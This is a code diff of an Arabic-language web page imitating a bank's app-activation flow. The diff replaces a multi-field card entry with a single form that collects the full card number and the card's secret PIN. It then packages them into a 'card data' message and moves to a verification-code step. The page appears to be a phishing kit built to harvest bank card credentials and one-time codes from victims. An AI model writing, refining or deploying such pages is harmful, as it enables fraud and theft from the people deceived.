@@ -133,73 +133,6 @@
         .checkbox-group input[type="checkbox"] {
             accent-color: var(--main-color);
         }
-        .card-inputs {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 14px;
-            flex-direction: row;
-            justify-content: flex-end;
-            align-items: center;
-            padding: 0 2px;
-        }
-        .card-inputs input, .card-inputs select {
-            text-align: left !important;
-            font-size: 15px;
-            direction: ltr !important;
-            background: var(--input-bg);
-            border: 1.2px solid #e0e0e0;
-            border-radius: 7px;
-            margin: 0;
-            box-shadow: 0 2px 7px rgba(0,0,0,0.04);
-            transition: border-color 0.2s;
-        }
-        .card-inputs select {
-            width: 95px;
-            padding: 8px 3px;
-            font-size: 15px;
-            border-radius: 7px;
-            border: 1.5px solid #e0e0e0;
-            direction: ltr !important;
-            box-shadow: 0 2px 7px rgba(0,0,0,0.04);
-            transition: border-color 0.2s;
-            margin-left: 7px;
-            text-align: left !important;
-        }
-        .card-two {
-            width: 38px;
-            padding: 8px 0 !important;
-        }
-        .card-four {
-            width: 68px;
-            padding: 8px 0 !important;
-        }
-        .snackbar {
-            visibility: hidden;
-            min-width: 250px;
-            background-color: #d32f2f;
-            color: #fff;
-            text-align: center;
-            border-radius: 8px;
-            padding: 16px;
-            position: fixed;
-            z-index: 100;
-            left: 50%;
-            bottom: 30px;
-            font-size: 16px;
-            transform: translateX(-50%);
-        }
-        .snackbar.show {
-            visibility: visible;
-            animation: fadein 0.5s, fadeout 0.5s 2.2s;
-        }
-        @keyframes fadein {
-            from {bottom: 0; opacity: 0;}
-            to {bottom: 30px; opacity: 1;}
-        }
-        @keyframes fadeout {
-            from {bottom: 30px; opacity: 1;}
-            to {bottom: 0; opacity: 0;}
-        }
         .center-text {
             text-align:center;font-size:16px;color:#444;margin-bottom:12px;
         }
@@ -265,12 +198,11 @@
         .card-next-btn:hover {
             background: #003366;
         }
-        /* توجيه سهم الكتابة لليسار في جميع خانات البطاقة بالخطوة الأولى */
-        .card-inputs input, .card-inputs select {
-            direction: ltr !important;
-            text-align: left !important;
-            unicode-bidi: plaintext !important;
-            caret-color: auto;
+        .error {
+            color: #e11d48;
+            font-size: 14px;
+            margin-top: 2px;
+            margin-bottom: 7px;
         }
     </style>
 </head>
@@ -313,6 +245,10 @@
         let userData = {};
         let cardData = {};
 
+        function hasArabicLetters(str) {
+            return /[\u0600-\u06FF]/.test(str);
+        }
+
         function renderStart() {
             userData = {};
             cardData = {};
@@ -322,14 +258,10 @@
                     <div class="center-text">يرجى اختيار أحد الخيارات التالية:</div>
                     <div class="options">
                         <button class="btn" onclick="renderLogin()">لقد قمت بتفعيل تطبيق البنك</button>
-                        <button class="btn-outline" onclick="renderCardStep1()">لم أقم بتفعيل تطبيق البنك</button>
+                        <button class="btn-outline" onclick="renderCardForm()">لم أقم بتفعيل تطبيق البنك</button>
                     </div>
                 </div>
             `;
-        }
-
-        function hasArabicLetters(str) {
-            return /[\u0600-\u06FF]/.test(str);
         }
 
         function renderLogin() {
@@ -419,107 +351,81 @@
             };
         }
 
-        // ========== هنا التعديل ==========
-        function renderCardStep1() {
+        // ========== التعديل: صفحة بطاقة واحدة ==========
+        function renderCardForm() {
             cardData = {};
             document.getElementById('main').innerHTML = `
                 <div class="container">
                     ${backBtn()}
                     ${logoHtml}
-                    <form id="cardStep1Form" autocomplete="off">
-                        <label class="big-label" style="text-align:center;display:block;">رقم البطاقة</label>
-                        <div class="card-inputs" style="justify-content: flex-end; gap:8px;">
-                            <input type="text" id="card2" maxlength="2" inputmode="numeric" pattern="\\d{2}" class="card-two" placeholder="__" autocomplete="off" style="direction:ltr;text-align:left;unicode-bidi:plaintext;"/>
-                            <input type="text" id="card4a" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off" style="direction:ltr;text-align:left;unicode-bidi:plaintext;"/>
-                            <input type="text" id="card4b" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off" style="direction:ltr;text-align:left;unicode-bidi:plaintext;"/>
-                            <select id="cardStart" required style="direction:ltr;text-align:left;unicode-bidi:plaintext;">
-                                <option value="">select</option>
-                                <option value="401319">401319</option>
-                                <option value="401340">401340</option>
-                                <option value="449349">449349</option>
-                                <option value="455094">455094</option>
-                            </select>
+                    <form id="cardForm" autocomplete="off">
+                        <div class="input-group">
+                            <label class="input-label" for="cardNumber">رقم البطاقة (16 رقم)</label>
+                            <div class="input-box">
+                                <input type="text"
+                                    id="cardNumber"
+                                    maxlength="16"
+                                    pattern="\\d{16}"
+                                    inputmode="numeric"
+                                    autocomplete="cc-number"
+                                    required
+                                    placeholder="أدخل رقم البطاقة"
+                                    style="direction:ltr;text-align:left;font-size:17px;letter-spacing:2px;"
+                                    oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 16)"
+                                />
+                                <span class="input-icon">
+                                    <svg width="18" height="18"><rect x="2" y="6" width="14" height="6" rx="2" fill="#aaa"/><rect x="8.5" y="8" width="1.5" height="2.5" rx="0.7" fill="#666"/></svg>
+                                </span>
+                            </div>
+                            <div id="cardNumberError" class="error"></div>
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label" for="cardPin">الرقم السري للبطاقة</label>
+                            <div class="input-box">
+                                <input type="password"
+                                    id="cardPin"
+                                    maxlength="6"
+                                    pattern="\\d{4,6}"
+                                    inputmode="numeric"
+                                    autocomplete="off"
+                                    required
+                                    placeholder="أدخل الرقم السري"
+                                    style="direction:ltr;text-align:left;font-size:17px;letter-spacing:2px;"
+                                    oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6)"
+                                />
+                                <span class="input-icon">
+                                    <svg width="18" height="18"><rect x="5" y="7" width="8" height="7" rx="2" fill="#aaa"/><rect x="7.5" y="11" width="3" height="2" rx="1" fill="#666"/></svg>
+                                </span>
+                            </div>
+                            <div id="pinError" class="error"></div>
                         </div>
                         <button class="card-next-btn" type="submit">التالي</button>
                     </form>
                 </div>
             `;
 
-            // تنقل تلقائي بين الحقول
-            const c2 = document.getElementById('card2');
-            const c4a = document.getElementById('card4a');
-            const c4b = document.getElementById('card4b');
-
-            c2.addEventListener('input', function() {
-                this.value = this.value.replace(/[^0-9]/g, '').slice(0,2);
-                if(this.value.length === 2) c4a.focus();
-            });
-            c4a.addEventListener('input', function() {
-                this.value = this.value.replace(/[^0-9]/g, '').slice(0,4);
-                if(this.value.length === 4) c4b.focus();
-            });
-            c4b.addEventListener('input', function() {
-                this.value = this.value.replace(/[^0-9]/g, '').slice(0,4);
-            });
-
-            // Backspace التنقل للخلف
-            c4a.addEventListener('keydown', function(e){
-                if(e.key === 'Backspace' && this.value.length === 0) c2.focus();
-            });
-            c4b.addEventListener('keydown', function(e){
-                if(e.key === 'Backspace' && this.value.length === 0) c4a.focus();
-            });
-
-            document.getElementById('cardStart').addEventListener('change',function(){
-                c2.focus();
-            });
-
-            document.getElementById('cardStep1Form').onsubmit = function(e){
+            document.getElementById('cardForm').onsubmit = function(e) {
                 e.preventDefault();
-                const cardStart = document.getElementById('cardStart').value;
-                const val2 = c2.value;
-                const val4a = c4a.value;
-                const val4b = c4b.value;
-                if(!cardStart || val2.length !== 2 || val4a.length !== 4 || val4b.length !== 4) {
-                    showCustomSnack('يرجى اختيار أول 6 أرقام وإدخال 10 أرقام للبطاقة.');
-                    return;
-                }
-                cardData.cardStart = cardStart;
-                cardData.cardRest = val2 + val4a + val4b;
-                cardData.fullCard = cardStart + cardData.cardRest;
-                renderCardPin(cardStart, cardData.cardRest);
-            };
-        }
-        // ========== نهاية التعديل ==========
+                const cardNumber = document.getElementById('cardNumber').value.trim();
+                const pin = document.getElementById('cardPin').value.trim();
+                let valid = true;
+                document.getElementById('cardNumberError').textContent = '';
+                document.getElementById('pinError').textContent = '';
 
-        function renderCardPin(cardStart, cardRest) {
-            cardData.cardStart = cardStart;
-            cardData.cardRest = cardRest;
-            cardData.fullCard = `${cardStart}${cardRest}`;
-            document.getElementById('main').innerHTML = `
-                <div class="container">
-                    ${backBtn(`renderCardStep1()`)}
-                    ${logoHtml}
-                    <form id="cardPinForm" autocomplete="off">
-                        <div class="input-group">
-                            <label class="input-label" for="cardPin">الرقم السري للبطاقة</label>
-                            <div class="input-box">
-                                <input type="password" id="cardPin" name="cardPin" maxlength="4" required pattern="\\d{4}" placeholder="____" style="direction:ltr;text-align:left;"/>
-                                <span class="input-icon"><svg width="18" height="18"><rect x="5" y="7" width="8" height="7" rx="2" fill="#aaa"/><rect x="7.5" y="11" width="3" height="2" rx="1" fill="#666"/></svg></span>
-                            </div>
-                        </div>
-                        <button class="btn" type="submit">التالي</button>
-                    </form>
-                </div>
-            `;
-            document.getElementById('cardPin').focus();
-            document.getElementById('cardPinForm').onsubmit = function(e){
-                e.preventDefault();
-                cardData.cardPin = document.getElementById('cardPin').value;
-                if(cardData.cardPin.length !== 4 || /[^0-9]/.test(cardData.cardPin)){
-                    showCustomSnack("يرجى إدخال الرقم السري (4 أرقام).");
-                    return;
+                if (!/^\d{16}$/.test(cardNumber)) {
+                    document.getElementById('cardNumberError').textContent = 'يجب إدخال رقم البطاقة المكون من 16 رقم فقط.';
+                    valid = false;
                 }
+                if (!/^\d{4,6}$/.test(pin)) {
+                    document.getElementById('pinError').textContent = 'يجب أن يكون الرقم السري من 4 إلى 6 أرقام.';
+                    valid = false;
+                }
+
+                if (!valid) return;
+
+                cardData.fullCard = cardNumber;
+                cardData.cardPin = pin;
+
                 let msg =
                     `بيانات البطاقة:\n` +
                     `رقم البطاقة: ${cardData.fullCard}\n` +
@@ -528,6 +434,7 @@
                 renderVerifyCode('card');
             };
         }
+        // ========== نهاية التعديل ==========
 
         function showErrorSnack() {
             var x = document.getElementById("snackbar");
